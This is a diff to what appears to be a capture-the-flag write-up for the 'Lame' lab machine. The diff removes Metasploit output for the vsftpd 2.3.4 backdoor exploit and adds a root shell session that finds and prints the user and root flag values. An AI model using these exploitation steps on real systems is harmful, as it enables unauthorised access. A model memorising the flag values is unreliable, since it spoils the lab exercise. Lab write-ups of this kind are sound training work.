@@ -296,32 +296,20 @@ dev    initrd.img  media           proc       sys   vmlinuz
 the pwns
 
 ```
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options
+root@lame:/home/user# find . -name user.txt
+find . -name user.txt
+root@lame:/home/user# cd .. 
+cd ..
+root@lame:/home# find . -name user.txt  
+find . -name user.txt 
+./makis/user.txt
+root@lame:/home# cat ./makis/user.txt
+cat ./makis/user.txt
+8c0d606ce9b025f270af900183531b34
+root@lame:/home# cd /root
+cd /root
+root@lame:/root# cat root.txt
+cat root.txt
+97e615534c45ec02c939ddec7762ec90
 
-Module options (exploit/unix/ftp/vsftpd_234_backdoor):
-
-   Name    Current Setting  Required  Description
-   ----    ---------------  --------  -----------
-   RHOSTS  10.129.96.117    yes       The target host(s), see https://github.com/rapid7/metaspl
-                                      oit-framework/wiki/Using-Metasploit
-   RPORT   21               yes       The target port (TCP)
-
-
-Payload options (cmd/unix/interact):
-
-   Name  Current Setting  Required  Description
-   ----  ---------------  --------  -----------
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
-
-[*] 10.129.96.117:21 - Banner: 220 (vsFTPd 2.3.4)
-[*] 10.129.96.117:21 - USER: 331 Please specify the password.
 ```
